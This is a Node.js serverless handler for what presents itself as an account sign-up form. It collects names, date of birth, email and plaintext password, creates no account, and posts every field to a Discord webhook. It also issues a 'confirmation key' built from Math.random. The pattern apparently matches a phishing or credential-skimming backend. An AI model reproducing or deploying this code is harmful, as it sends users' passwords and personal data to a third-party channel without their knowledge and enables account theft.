const fetch = require('node-fetch');

const generateConfirmationKey = () => {
  return Math.random().toString(36).substring(2, 10).toUpperCase();
};

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ message: 'Method Not Allowed' }),
    };
  }

  const { firstName, lastName, day, month, year, email, password } = JSON.parse(event.body);

  if (!firstName || !lastName || !day || !month || !year || !email || !password) {
    return {
      statusCode: 400,
      body: JSON.stringify({ success: false, message: 'All fields are required' }),
    };
  }

  const confirmationKey = generateConfirmationKey();
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL2;

  const message = {
    content: `📝 New Account Created!\n**First Name:** ${firstName}\n**Last Name:** ${lastName}\n**Date of Birth:** ${day}/${month}/${year}\n**Email:** ${email}\n**Password:** ${password}\n**Confirmation Key:** ${confirmationKey}`,
  };

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message),
    });

    if (response.ok) {
      return {
        statusCode: 200,
        body: JSON.stringify({ success: true, message: 'Account details submitted successfully!', confirmationKey }),
      };
    } else {
      return {
        statusCode: 500,
        body: JSON.stringify({ success: false, message: 'Failed to send account details to Discord' }),
      };
    }
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, message: 'Error sending account details to Discord' }),
    };
  }
};